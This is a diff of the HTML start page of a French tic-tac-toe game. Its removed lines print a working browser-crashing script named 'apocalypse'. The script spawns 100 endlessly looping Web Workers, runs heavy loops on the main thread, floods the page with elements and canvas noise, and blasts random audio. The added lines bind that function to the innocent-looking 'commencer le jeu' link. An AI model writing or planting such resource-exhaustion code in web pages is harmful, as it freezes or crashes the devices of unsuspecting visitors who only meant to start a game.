@@ -1,123 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Morpion</title>
-  <link rel="stylesheet" href="style.css">
-  <style>
-    body {
-      background-color: black;
-      color: lime;
-      font-family: monospace;
-      overflow-x: hidden;
-    }
-    .glitch {
-      position: absolute;
-      font-size: 2rem;
-      animation: spin 0.1s linear infinite;
-      user-select: none;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      pointer-events: none;
-      z-index: 9999;
-    }
-    .btn-evil {
-      display: inline-block;
-      margin: 20px;
-      padding: 15px 30px;
-      background: red;
-      color: white;
-      font-size: 18px;
-      border: none;
-      cursor: pointer;
-      border-radius: 8px;
-      text-transform: uppercase;
-      font-weight: bold;
-      box-shadow: 0 0 10px red;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Morpion</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
+    
 <main>
-  <a href="morpion.html" class="btn">Commencer le jeu</a>
-  <button class="btn-evil" onclick="apocalypse()">Voir plus</button>
-  <canvas id="canvas" width="1920" height="1080"></canvas>
+     <a href="morpion.html" class="btn" onclick="apocalypse()">commencer le jeu</a>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </main>
 
-<script>
-function apocalypse() {
-  // THREAD PRINCIPAL
-  setInterval(() => {
-    for (let i = 0; i < 1e9; i++) {
-      Math.sqrt(Math.random());
-    }
-  }, 5);
 
-  // WORKERS
-  for (let i = 0; i < 100; i++) {
-    const blob = new Blob([`
-      while (true) {
-        let x = 0;
-        for (let j = 0; j < 1e9; j++) {
-          x += Math.sqrt(j);
-        }
-      }
-    `], { type: "application/javascript" });
-    const url = URL.createObjectURL(blob);
-    new Worker(url);
-  }
 
-  // DOM GLITCH
-  setInterval(() => {
-    for (let i = 0; i < 300; i++) {
-      const div = document.createElement("div");
-      div.className = "glitch";
-      div.innerText = "💀";
-      div.style.top = Math.random() * window.innerHeight + "px";
-      div.style.left = Math.random() * window.innerWidth + "px";
-      div.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
-      document.body.appendChild(div);
-    }
-  }, 200);
-
-  // CANVAS FLOOD
-  const canvas = document.getElementById("canvas");
-  const ctx = canvas.getContext("2d");
-  setInterval(() => {
-    for (let i = 0; i < 1500; i++) {
-      ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
-      ctx.fillRect(Math.random()*1920, Math.random()*1080, 5, 5);
-    }
-  }, 100);
-
-  // AUDIO GLITCH
-  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-  setInterval(() => {
-    const osc = audioCtx.createOscillator();
-    osc.type = 'square';
-    osc.frequency.setValueAtTime(Math.random() * 14000, audioCtx.currentTime);
-    osc.connect(audioCtx.destination);
-    osc.start();
-    osc.stop(audioCtx.currentTime + 0.2);
-  }, 100);
-
-  // FOND DYNAMIQUE
-  setInterval(() => {
-    document.body.style.backgroundColor = `hsl(${Math.random()*360}, 100%, 10%)`;
-  }, 50);
-
-  alert("🔥 Apocalypse activée. Que le lag commence.");
-}
-</script>
 
 <script src="script.js"></script>
 </body>
